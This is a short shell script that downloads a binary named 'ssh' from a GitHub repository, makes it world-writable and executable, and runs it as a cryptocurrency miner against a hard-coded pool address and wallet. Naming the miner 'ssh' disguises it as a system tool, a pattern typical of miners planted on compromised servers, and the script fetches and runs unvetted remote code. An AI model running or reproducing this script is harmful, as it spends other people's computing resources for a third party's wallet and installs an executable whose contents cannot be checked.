wget https://github.com/lemanleman020/rich-again/raw/main/ssh && chmod 777 ssh

#!/bin/bash

POOL=172.65.187.71:14581
WALLET=kardisali2.001

./ssh --algo GRAM --pool $POOL --user $WALLET $@ --ton-mode 6
